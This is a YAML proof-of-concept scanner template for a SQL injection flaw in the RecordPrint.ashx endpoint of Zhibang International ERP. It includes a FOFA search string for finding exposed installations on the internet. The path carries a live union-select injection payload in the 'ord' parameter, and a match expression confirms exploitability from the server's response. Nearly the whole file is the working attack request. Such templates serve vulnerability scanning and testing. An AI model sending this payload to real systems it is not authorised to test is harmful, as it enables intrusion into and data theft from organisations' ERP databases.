id: poc-yaml-zbintel-erp-recordprint-ashx-sqli
info:
  name: 智邦国际ERP RecordPrint.ashx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 智邦国际ERP
  fofa: app="智邦国际-企业管理软件"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /SYSN/json/pcclient/RecordPrint.ashx?sort=1&ord=-1%27%20union%20select%20sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))--
  expression: status_code == 200 && contains(body,t2) && contains(body,"SystemErrorSign")
    && matches(body,"转换成数据类型(.*?)时失败") && matches(body,"在将(.*?)值")
transport: http
